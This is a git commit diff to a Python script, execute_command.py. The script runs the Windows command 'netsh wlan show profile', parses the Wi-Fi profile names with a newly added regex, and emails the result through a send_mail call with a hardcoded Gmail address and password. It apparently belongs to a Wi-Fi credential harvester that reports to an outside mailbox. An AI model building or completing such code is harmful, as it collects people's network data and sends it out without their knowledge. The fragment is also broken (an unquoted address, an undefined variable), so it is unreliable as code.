e760abf69c679c6165ec97afccadf0b50a1eac69
Paul St. Amour <paul35444@aol.com>
2021-05-05 13:03:07 -0500

    +regex str to search for

--- execute_command.py
+++ execute_command.py
@@ -14,6 +14,7 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names = re.search("")
+#\s* regex to accept any amount of blank space
+network_names = re.search("Profile\s*:\s")
 
 send_mail(name@gmail.com, "password123", result)
